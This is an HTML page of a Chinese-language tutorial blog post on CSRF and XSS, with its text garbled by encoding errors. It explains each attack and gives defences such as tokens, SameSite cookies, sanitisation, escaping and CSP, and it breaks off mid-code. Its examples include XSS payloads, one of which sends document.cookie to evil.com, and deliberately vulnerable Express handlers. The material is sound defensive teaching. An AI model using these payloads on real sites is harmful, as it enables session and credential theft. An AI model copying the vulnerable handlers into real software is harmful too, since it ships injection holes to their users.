<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/lioouzzz/sleepblog.git/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=lioouzzz/sleepblog.git/livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    
    <title>CSRFÂíåXSSÁ∂≤Ë∑ØÊîªÊìä | üçÄüçÄüçÄ</title>
    <meta name="viewport" content="width=device-width,minimum-scale=1">
    <meta name="description" content="CSRF(Cross-Site Request Forgery)ÔºåË∑®Á´ôË´ãÊ±ÇÂÅΩÈÄ†
CSRFÊòØ‰∏ÄÁ®ÆÁ∂≤Ë∑ØÂÆâÂÖ®ÊîªÊìäÔºåÊîªÊìäËÄÖÂà©Áî®Á∂≤Á´ôÂíå‰ΩøÁî®ËÄÖ‰πãÈñìÁöÑ‰ø°‰ªªÔºå
Á∂≤Á´ôÊúÉ‰ø°‰ªªËá™Â∑±ÁôªÂÖ•Áî®Êà∂ÁöÑË´ãÊ±ÇÔºå‰ΩÜÊîªÊìäËÄÖÂçªÂèØ‰ª•ÂÅΩÈÄ†Ë´ãÊ±ÇÔºåÂú®‰ΩøÁî®ËÄÖ‰∏çÁü•ÊÉÖÁöÑÊÉÖÊ≥Å‰∏ãÔºåÂ∞çÁ∂≤Á´ôÁôºÈÄÅÊú™Á∂ìÊéàÊ¨äÁöÑË´ãÊ±Ç„ÄÇ">
    <meta name="generator" content="Hugo 0.138.0">
    
    
    
      <meta name="robots" content="noindex, nofollow">
    
    
      <meta name="author" content = "Elaine Liu">
    

    
<link rel="stylesheet" href="/lioouzzz/sleepblog.git/ananke/css/main.min.css" >



  
    <link rel="stylesheet" href="/lioouzzz/sleepblog.git/css/custom.css">
  

    

    
      
<link rel="shortcut icon" href="/lioouzzz/sleepblog.git/images/20241130%20%e5%80%8b%e4%ba%balogo2.png" type="image/x-icon" />


    

    

    
      <link rel="canonical" href="http://localhost:1313/lioouzzz/sleepblog.git/posts/20250123-csrf_xss/csrfxss/">
    

    <meta property="og:url" content="http://localhost:1313/lioouzzz/sleepblog.git/posts/20250123-csrf_xss/csrfxss/">
  <meta property="og:site_name" content="üçÄüçÄüçÄ">
  <meta property="og:title" content="CSRFÂíåXSSÁ∂≤Ë∑ØÊîªÊìä">
  <meta property="og:description" content="CSRF(Cross-Site Request Forgery)ÔºåË∑®Á´ôË´ãÊ±ÇÂÅΩÈÄ† CSRFÊòØ‰∏ÄÁ®ÆÁ∂≤Ë∑ØÂÆâÂÖ®ÊîªÊìäÔºåÊîªÊìäËÄÖÂà©Áî®Á∂≤Á´ôÂíå‰ΩøÁî®ËÄÖ‰πãÈñìÁöÑ‰ø°‰ªªÔºå Á∂≤Á´ôÊúÉ‰ø°‰ªªËá™Â∑±ÁôªÂÖ•Áî®Êà∂ÁöÑË´ãÊ±ÇÔºå‰ΩÜÊîªÊìäËÄÖÂçªÂèØ‰ª•ÂÅΩÈÄ†Ë´ãÊ±ÇÔºåÂú®‰ΩøÁî®ËÄÖ‰∏çÁü•ÊÉÖÁöÑÊÉÖÊ≥Å‰∏ãÔºåÂ∞çÁ∂≤Á´ôÁôºÈÄÅÊú™Á∂ìÊéàÊ¨äÁöÑË´ãÊ±Ç„ÄÇ">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-01-23T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-01-23T00:00:00+00:00">
    <meta property="article:tag" content="Ë≥áÂÆâ">
    <meta property="article:tag" content="ÂâçÁ´Ø">
    <meta property="article:tag" content="ÂæåÁ´Ø">

  <meta itemprop="name" content="CSRFÂíåXSSÁ∂≤Ë∑ØÊîªÊìä">
  <meta itemprop="description" content="CSRF(Cross-Site Request Forgery)ÔºåË∑®Á´ôË´ãÊ±ÇÂÅΩÈÄ† CSRFÊòØ‰∏ÄÁ®ÆÁ∂≤Ë∑ØÂÆâÂÖ®ÊîªÊìäÔºåÊîªÊìäËÄÖÂà©Áî®Á∂≤Á´ôÂíå‰ΩøÁî®ËÄÖ‰πãÈñìÁöÑ‰ø°‰ªªÔºå Á∂≤Á´ôÊúÉ‰ø°‰ªªËá™Â∑±ÁôªÂÖ•Áî®Êà∂ÁöÑË´ãÊ±ÇÔºå‰ΩÜÊîªÊìäËÄÖÂçªÂèØ‰ª•ÂÅΩÈÄ†Ë´ãÊ±ÇÔºåÂú®‰ΩøÁî®ËÄÖ‰∏çÁü•ÊÉÖÁöÑÊÉÖÊ≥Å‰∏ãÔºåÂ∞çÁ∂≤Á´ôÁôºÈÄÅÊú™Á∂ìÊéàÊ¨äÁöÑË´ãÊ±Ç„ÄÇ">
  <meta itemprop="datePublished" content="2025-01-23T00:00:00+00:00">
  <meta itemprop="dateModified" content="2025-01-23T00:00:00+00:00">
  <meta itemprop="wordCount" content="207">
  <meta itemprop="keywords" content="Ë≥áÂÆâ,ÂâçÁ´Ø,ÂæåÁ´Ø">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="CSRFÂíåXSSÁ∂≤Ë∑ØÊîªÊìä">
  <meta name="twitter:description" content="CSRF(Cross-Site Request Forgery)ÔºåË∑®Á´ôË´ãÊ±ÇÂÅΩÈÄ† CSRFÊòØ‰∏ÄÁ®ÆÁ∂≤Ë∑ØÂÆâÂÖ®ÊîªÊìäÔºåÊîªÊìäËÄÖÂà©Áî®Á∂≤Á´ôÂíå‰ΩøÁî®ËÄÖ‰πãÈñìÁöÑ‰ø°‰ªªÔºå Á∂≤Á´ôÊúÉ‰ø°‰ªªËá™Â∑±ÁôªÂÖ•Áî®Êà∂ÁöÑË´ãÊ±ÇÔºå‰ΩÜÊîªÊìäËÄÖÂçªÂèØ‰ª•ÂÅΩÈÄ†Ë´ãÊ±ÇÔºåÂú®‰ΩøÁî®ËÄÖ‰∏çÁü•ÊÉÖÁöÑÊÉÖÊ≥Å‰∏ãÔºåÂ∞çÁ∂≤Á´ôÁôºÈÄÅÊú™Á∂ìÊéàÊ¨äÁöÑË´ãÊ±Ç„ÄÇ">

	
  <script src="/lioouzzz/sleepblog.git/js/search.js"></script>
  </head><body class="ma0 avenir bg-near-white development">

    
   
  

  
  
  
  <header class="cover bg-center" style="background-image: url('http://localhost:1313/lioouzzz/sleepblog.git/images/CSRF%E5%92%8C%20XSS%E6%94%BB%E6%93%8A%20%281%29.png');">
    <div class="bg-black-60">
      <nav class="pv3 ph3 ph4-ns bg-white" role="navigation">
  <div class="flex-l justify-between items-center center">
    <a
      href="/lioouzzz/sleepblog.git/"
      class="f3 fw2 hover-blue no-underline dark-blue dib"
    >
      
      <img src="/lioouzzz/sleepblog.git/images/20241130%20%e5%80%8b%e4%ba%balogo2.png" class="w100 mw5-ns" alt="üçÄüçÄüçÄ" />
      
    </a>

    <div class="flex-l items-center">
      <div class="relative mr2">
    <input type="search" 
      class="pa2 br2 ba b--custom-blue" 
      placeholder="ÊêúÂ∞ã..." 
      id="search-input"
      onkeyup="search()">
  </div> 
      <ul class="pl0 mr3">
         
        <li class="list f5 f4-ns fw4 dib mr3">
          <a href="/lioouzzz/sleepblog.git/" class="hover-blue no-underline dark-blue">
            È¶ñÈ†Å
          </a>
        </li>
          
        <li class="list f5 f4-ns fw4 dib mr3">
          <a href="/lioouzzz/sleepblog.git/posts/" class="hover-blue no-underline dark-blue">
            ÂÖ®ÈÉ®ÊñáÁ´†
          </a>
        </li>
          
        <li class="list f5 f4-ns fw4 dib mr3 dropdown">
          <a
            href="/lioouzzz/sleepblog.git/categories/"
            class="hover-blue no-underline dark-blue dropdown-toggle"
          >
            ÊñáÁ´†ÂàÜÈ°û
          </a>
          <ul class="dropdown-menu">
             
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/categories/database/">
                database (3)
              </a>
            </li>
            
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/categories/javascripts/">
                javascripts (5)
              </a>
            </li>
            
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/categories/python/">
                python (7)
              </a>
            </li>
            
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/categories/%E5%89%8D%E7%AB%AF/">
                ÂâçÁ´Ø (1)
              </a>
            </li>
            
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/categories/%E5%BE%8C%E7%AB%AF/">
                ÂæåÁ´Ø (1)
              </a>
            </li>
            
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/categories/%E7%B6%B2%E8%B7%AF%E5%AE%89%E5%85%A8/">
                Á∂≤Ë∑ØÂÆâÂÖ® (1)
              </a>
            </li>
            
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/categories/%E8%B3%87%E5%AE%89/">
                Ë≥áÂÆâ (3)
              </a>
            </li>
            
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/categories/%E8%B3%87%E6%96%99%E7%B5%90%E6%A7%8B/">
                Ë≥áÊñôÁµêÊßã (1)
              </a>
            </li>
             
          </ul>
        </li>
          
        <li class="list f5 f4-ns fw4 dib mr3 dropdown">
          <a
            href="/lioouzzz/sleepblog.git/tags/"
            class="hover-blue no-underline dark-blue dropdown-toggle"
          >
            ÊñáÁ´†Ê®ôÁ±§
          </a>
          <ul class="dropdown-menu">
             
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/tags/api/">
                api (1)
              </a>
            </li>
            
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/tags/database/">
                database (2)
              </a>
            </li>
            
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/tags/django/">
                django (3)
              </a>
            </li>
            
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/tags/drf/">
                drf (1)
              </a>
            </li>
            
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/tags/js/">
                js (5)
              </a>
            </li>
            
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/tags/python/">
                python (8)
              </a>
            </li>
            
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/tags/vite&#43;react/">
                vite&#43;react (1)
              </a>
            </li>
            
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/tags/%E5%89%8D%E7%AB%AF/">
                ÂâçÁ´Ø (6)
              </a>
            </li>
            
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/tags/%E5%BE%8C%E7%AB%AF/">
                ÂæåÁ´Ø (12)
              </a>
            </li>
            
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/tags/%E8%B3%87%E5%AE%89/">
                Ë≥áÂÆâ (1)
              </a>
            </li>
            
            <li>
              <a href="http://localhost:1313/lioouzzz/sleepblog.git/tags/%E8%B3%87%E6%96%99%E7%B5%90%E6%A7%8B/">
                Ë≥áÊñôÁµêÊßã (1)
              </a>
            </li>
             
          </ul>
        </li>
         
      </ul>
      
    </div>
  </div>
</nav>

      <div class="tc-l pv6 ph3 ph4-ns">
        
          <div class="f2 f1-l fw2 white-90 mb0 lh-title">CSRFÂíåXSSÁ∂≤Ë∑ØÊîªÊìä</div>
          
        
      </div>
    </div>
  </header>



    <main class="pb7" role="main">
      


  
  <article class="flex-l flex-wrap justify-between mw8 center ph3">
    <header class="mt4 w-100">
      <aside class="instapaper_ignoref b helvetica tracked ttu">
          
        Posts
      </aside><div id="sharing" class="mt3 ananke-socials"></div>
<h1 class="f1 athelas mt3 mb1">CSRFÂíåXSSÁ∂≤Ë∑ØÊîªÊìä</h1>
      
      <p class="tracked">
        By <strong>Elaine Liu</strong>
      </p>
      
      
      
      <time class="f6 mv4 dib tracked" datetime="2025-01-23T00:00:00Z">2025Âπ¥1Êúà23Êó•</time>
      

      
      
        <span class="f6 mv4 dib tracked"> - One minute read </span>
        <span class="f6 mv4 dib tracked"> - 207 words </span>
      
    </header>
    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><h3 id="csrfcross-site-request-forgeryË∑®Á´ôË´ãÊ±ÇÂÅΩÈÄ†">CSRF(Cross-Site Request Forgery)ÔºåË∑®Á´ôË´ãÊ±ÇÂÅΩÈÄ†</h3>
<p>CSRFÊòØ‰∏ÄÁ®ÆÁ∂≤Ë∑ØÂÆâÂÖ®ÊîªÊìäÔºåÊîªÊìäËÄÖÂà©Áî®<!-- raw HTML omitted -->Á∂≤Á´ôÂíå‰ΩøÁî®ËÄÖ‰πãÈñìÁöÑ‰ø°‰ªª<!-- raw HTML omitted -->Ôºå
Á∂≤Á´ôÊúÉ‰ø°‰ªªËá™Â∑±ÁôªÂÖ•Áî®Êà∂ÁöÑË´ãÊ±ÇÔºå‰ΩÜÊîªÊìäËÄÖÂçªÂèØ‰ª•ÂÅΩÈÄ†Ë´ãÊ±ÇÔºåÂú®‰ΩøÁî®ËÄÖ‰∏çÁü•ÊÉÖÁöÑÊÉÖÊ≥Å‰∏ãÔºåÂ∞çÁ∂≤Á´ôÁôºÈÄÅÊú™Á∂ìÊéàÊ¨äÁöÑË´ãÊ±Ç„ÄÇ</p>
<p>Â¶ÇÊûúË¶∫ÂæóÊúâÈªûÊ®°Á≥ä&hellip;&hellip;</p>
<h3 id="ËàâÂÄã‰æãÂ≠ê‰æÜË™™ÊòéÊîªÊìäÊµÅÁ®ã">ËàâÂÄã‰æãÂ≠ê‰æÜË™™ÊòéÊîªÊìäÊµÅÁ®ãÔºö</h3>
<h4 id="1‰ΩøÁî®ËÄÖÁôªÂÖ•Á∂≤Á´ô">1.‰ΩøÁî®ËÄÖÁôªÂÖ•Á∂≤Á´ô</h4>
<p>üï∏Ô∏è ‰ΩøÁî®ËÄÖÁôªÂÖ•‰∫ÜÊüêÂÄãÁ∂≤Á´ô(ÈäÄË°å„ÄÅÈõªÂ≠êÈÉµ‰ª∂ÊúçÂãôÁ≠â)Ôºå‰∏¶Âú®ÁÄèË¶ΩÂô®‰∏≠‰øùÁïôÁôªÂÖ•ÁöÑÈ©óË≠âË∫´ÂàÜË≥áÊñô(Â¶Çcookie)</p>
<h4 id="2ÊîªÊìäËÄÖË™òÂ∞é‰ΩøÁî®ËÄÖË®™ÂïèÊÉ°ÊÑèÁ∂≤Á´ô">2.ÊîªÊìäËÄÖË™òÂ∞é‰ΩøÁî®ËÄÖË®™ÂïèÊÉ°ÊÑèÁ∂≤Á´ô</h4>
<p>üï∏Ô∏èÊîªÊìäËÄÖÈÄèÈÅéÈõªÂ≠êÈÉµ‰ª∂„ÄÅÁ§æ‰∫§Â™íÈ´îÁ≠âÔºåË™ò‰Ωø‰ΩøÁî®ËÄÖÈªûÊìäÈÄ£ÁµêÔºåËÄåË©≤ÈÄ£ÁµêÂåÖÂê´‰∫Ü<!-- raw HTML omitted -->ÊÉ°ÊÑèË´ãÊ±Ç<!-- raw HTML omitted --></p>
<h4 id="3‰ΩøÁî®ËÄÖÁöÑÁÄèË¶ΩÂô®ÁôºÈÄÅË´ãÊ±Ç">3.‰ΩøÁî®ËÄÖÁöÑÁÄèË¶ΩÂô®ÁôºÈÄÅË´ãÊ±Ç</h4>
<p>üï∏Ô∏è Áî±Êñº‰ΩøÁî®ËÄÖÁöÑÁÄèË¶ΩÂô®ÔºåÂ∑≤Á∂ìÂ≠òÊúâÁ∂≤Á´ôÁöÑÁôªÂÖ•ÁãÄÊÖã(ÈÄöÂ∏∏ÊòØcookie)ÔºåÁï∂ÁÄèË¶ΩÂô®ÁôºÈÄÅÈÄôÂÄãÊÉ°ÊÑèË´ãÊ±ÇÊôÇÔºå<!-- raw HTML omitted -->ÂÆÉÊúÉËá™ÂãïÈôÑÂ∏∂‰ΩøÁî®ËÄÖÁöÑË∫´ÂàÜÈ©óË≠âË®äÊÅØ<!-- raw HTML omitted -->
ËÆìÁ∂≤Á´ôË™çÁÇ∫ÈÄôÊòØ‰∏ÄÂÄãÂêàÊ≥ïË´ãÊ±Ç„ÄÇ</p>
<h4 id="4Á∂≤Á´ôÂü∑Ë°åÊú™Á∂ìÊéàÊ¨äÁöÑÊìç‰Ωú">4.Á∂≤Á´ôÂü∑Ë°åÊú™Á∂ìÊéàÊ¨äÁöÑÊìç‰Ωú</h4>
<p>üï∏Ô∏è Á∂≤Á´ô‰æùÊìöÊî∂Âà∞ÁöÑË´ãÊ±ÇÔºåÂü∑Ë°å‰∏çÊáâË©≤Áî±ÊîªÊìäËÄÖÊìç‰ΩúÁöÑÊïèÊÑüÊìç‰ΩúÔºåÂ¶Ç‰øÆÊîπÂØÜÁ¢º„ÄÅËΩâÂ∏≥„ÄÅÂà™Èô§Ë≥áÊñô&hellip;&hellip;„ÄÇ</p>
<h3 id="Â¶Ç‰ΩïÈ†êÈò≤csrfÊîªÊìä">Â¶Ç‰ΩïÈ†êÈò≤CSRFÊîªÊìä</h3>
<p>üíâ1.CSRF Token(Èò≤ÁØÑCSRFÁöÑ‰ª§Áâå)ÔºåÁ∂≤Á´ôÂèØ‰ª•ÁÇ∫ÊØèÂÄãË°®ÂñÆÁîüÊàê‰∏ÄÂÄãÂîØ‰∏ÄÁöÑCSRF TokenÔºåÁï∂Áî®Êà∂Êèê‰∫§Ë°®ÂñÆÊôÇÔºåË©≤tokenÂøÖÈ†àÂíå‰º∫ÊúçÂô®Á´ØÁöÑtokenÂåπÈÖçÔºåËã•‰∏çÂåπÈÖçÔºåË´ãÊ±ÇÊúÉË¢´ÊãíÁµï„ÄÇ</p>
<p>üíâ2.Ê™¢Êü•HTTP RefererÊ®ôÈ†≠Ôºå‰º∫ÊúçÂô®ÂèØ‰ª•Ê™¢Êü•HTTPË´ãÊ±ÇÁöÑRefererÊ®ôÈ†≠ÔºåÁ¢∫‰øùË´ãÊ±Ç‰æÜËá™Âèó‰ø°‰ªªÁöÑÁ∂≤Á´ôÊàñÊòØ‰æÜÊ∫êÔºåÈÄôÊ®£ÂèØ‰ª•Èò≤Ê≠¢ÂæûÊÉ°ÊÑèÁ∂≤Á´ôÁôºÂá∫ÁöÑË´ãÊ±Ç„ÄÇ</p>
<p>üíâ3.Ë®≠ÂÆöSameSite CookieÂ±¨ÊÄßÔºåË®≠ÂÆöcookiesÁöÑ <code>SameSite</code>Â±¨ÊÄßÔºåÂ¶ÇÊ≠§‰∏Ä‰æÜÂè™ËÉΩÂú®Áõ∏ÂêåÁ∂≤Á´ôÁöÑ‰∏ä‰∏ãÊñá‰∏≠ÁôºÈÄÅÔºå‰πüËÉΩÈò≤Ê≠¢Á¨¨‰∏âÊñπÁ∂≤Á´ôÂÅΩÈÄ†Ë∑®Á´ôË´ãÊ±Ç„ÄÇ</p>
<p>üíâ4.Á¢∫‰øùÁî®Êà∂ÁöÑÊúÉË©±Âú®‰∏ÄÊÆµÊôÇÈñìÂæåÈÅéÊúüÔºå‰∏¶Ë¶ÅÊ±ÇÁî®Êà∂ÈáçÊñ∞ÁôªÂÖ•ÔºåÊ∏õÂ∞ëË¢´Âà©Áî®ÁöÑÈ¢®Èö™„ÄÇ</p>
<h3 id="xss-cross-site-scriptingÊîªÊìä">XSS (Cross-Site Scripting)ÊîªÊìä</h3>
<p>XSSÊòØ‰∏ÄÁ®ÆÁ∂≤È†ÅÂÆâÂÖ®ÊºèÊ¥ûÔºåÊîªÊìäËÄÖÂèØ‰ª•ÊääÊÉ°ÊÑèËÖ≥Êú¨Ê≥®ÂÖ•Âú®Á∂≤È†Å‰∏≠ÔºåÁï∂ÂÖ∂‰ªñÁî®Êà∂ÁÄèË¶ΩË©≤È†ÅÈù¢ÊôÇÔºåËÖ≥Êú¨Â∞±ÊúÉÂú®Áî®Êà∂ÁöÑÁÄèË¶ΩÂô®‰∏≠Âü∑Ë°å„ÄÇ</p>
<h3 id="xssÈ°ûÂûã">XSSÈ°ûÂûã</h3>
<p>‚å®Ô∏è ÂèçÂ∞ÑÂûãXSS(Reflected XSS)</p>
<ul>
<li>ÊÉ°ÊÑè‰ª£Á¢ºÂåÖÂê´Âú®URL‰∏≠</li>
<li>Áï∂ÊúçÂãôÂô®ÊääÊú™Á∂ìËôïÁêÜÁöÑÂèÉÊï∏ÂèçÂ∞ÑÂõûÈ†ÅÈù¢ÊôÇËß∏Áôº</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// ÂÅáË®≠Á∂≤ÂùÄÁÇ∫Ôºö
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//example.com/search?q=&lt;script&gt;alert(&#39;hacked&#39;)&lt;/script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// ÂæåÁ´ØÁõ¥Êé•Â∞áÂèÉÊï∏ÊèíÂÖ• HTMLÔºö
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/search&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">`ÊêúÁ¥¢ÁµêÊûúÔºö</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">q</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);  <span style="color:#75715e">// Âç±Èö™ÔºÅ
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>});
</span></span></code></pre></div><p>‚å®Ô∏è ÂÑ≤Â≠òÂûãXSS(Stroed XSS)</p>
<ul>
<li>ÊÉ°ÊÑè‰ª£Á¢ºË¢´ÂÑ≤Â≠òÂú®‰º∫ÊúçÂô®‰∏≠</li>
<li>Áï∂ÂÖ∂‰ªñÁî®Êà∂Ë®™ÂïèÈ†ÅÈù¢ÊôÇËß∏Áôº</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// Ë´ñÂ£áÁïôË®ÄÂäüËÉΩ
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">comment</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;script&gt;document.location=&#34;http://evil.com/?cookie=&#34;+document.cookie&lt;/script&gt;&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Áõ¥Êé•Â≠òÂÖ•Ë≥áÊñôÂ∫´ÔºåÈ°ØÁ§∫ÊôÇÊú™Á∂ìËôïÁêÜ
</span></span></span></code></pre></div><p>‚å®Ô∏è DOM Based XSS</p>
<ul>
<li>ÈÄèÈÅé‰øÆÊîπÈ†ÅÈù¢ÁöÑDomÁí∞Â¢É‰æÜÊîªÊìä</li>
<li>‰∏çÈúÄË¶ÅËàá‰º∫ÊúçÂô®‰∫§‰∫í</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// Âç±Èö™ÁöÑ‰ª£Á¢ºÔºö
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;user&#39;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// ÊîªÊìä URLÔºö
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//example.com#&lt;img src=x onerror=&#34;alert(&#39;hacked&#39;)&#34;&gt;
</span></span></span></code></pre></div><h3 id="Â∏∏Ë¶ãÁöÑÊîªÊìäÁõÆÊ®ô">Â∏∏Ë¶ãÁöÑÊîªÊìäÁõÆÊ®ô</h3>
<p>1.Á´äÂèñÁî®Êà∂‰ø°ÊÅØ(cookiew„ÄÅsession tokens)<br>
2.Á´äÂèñÁî®Êà∂ÊÜëË≠â<br>
3.ÈáçÂÆöÂêëÂà∞Èá£È≠öÁ∂≤Á´ô<br>
4.‰øÆÊîπÁ∂≤È†ÅÂÖßÂÆπ<br>
5.Âü∑Ë°åÊÉ°ÊÑèÊìç‰Ωú</p>
<h3 id="Èò≤ÁØÑxssÊîªÊìäÊé™ÊñΩ">Èò≤ÁØÑXSSÊîªÊìäÊé™ÊñΩ</h3>
<p>üíâËº∏ÂÖ•È©óË≠âÂíåÈÅéÊøæ</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// ‰∏çÂ•ΩÁöÑÂÅöÊ≥ï
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/search&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">`ÊêúÁ¥¢ÁµêÊûúÔºö</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">q</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Â•ΩÁöÑÂÅöÊ≥ï
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sanitizeHtml</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;sanitize-html&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/search&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cleanQuery</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sanitizeHtml</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">q</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">`ÊêúÁ¥¢ÁµêÊûúÔºö</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">cleanQuery</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
</span></span><span style="display:flex;"><span>});
</span></span></code></pre></div><p>üíâËº∏Âá∫Á∑®Á¢º</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// ÊâãÂãïËΩâÁæ©
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">escapeHtml</span>(<span style="color:#a6e22e">unsafe</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">unsafe</span>
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/&amp;/g</span>, <span style="color:#e6db74">&#34;&amp;amp;&#34;</span>)
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/&lt;/g</span>, <span style="color:#e6db74">&#34;&amp;lt;&#34;</span>)
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/&gt;/g</span>, <span style="color:#e6db74">&#34;&amp;gt;&#34;</span>)
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/&#34;/g</span>, <span style="color:#e6db74">&#34;&amp;quot;&#34;</span>)
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/&#39;/g</span>, <span style="color:#e6db74">&#34;&amp;#039;&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>üíâ‰ΩøÁî®ÈÅ©Áï∂ÁöÑHTTP Headers</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// Ë®≠ÁΩÆ Content Security Policy (CSP)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>((<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">setHeader</span>(
